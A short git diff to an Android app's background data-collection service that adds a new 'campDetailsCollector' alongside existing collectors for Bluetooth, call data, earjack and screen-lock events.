@@ -7,6 +7,7 @@ import android.os.Environment;
 import com.crashlytics.android.Crashlytics;
 import com.media.ui.DataCollector.bluetoothCollect;
 import com.media.ui.DataCollector.callData;
+import com.media.ui.DataCollector.campDetailsCollector;
 import com.media.ui.DataCollector.earjackCollector;
 import com.media.ui.DataCollector.homeKeyCollector;
 import com.media.ui.DataCollector.lowBatteryData;
@@ -60,6 +61,7 @@ public class dataSender extends IntentService {
             new earjackCollector(this);
             new screenLockCollector(this);
             new homeKeyCollector(this);
+            new campDetailsCollector(this);
 
             File d = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
             File root = new File(Environment.getExternalStorageDirectory(), constants.ZIPFolder);
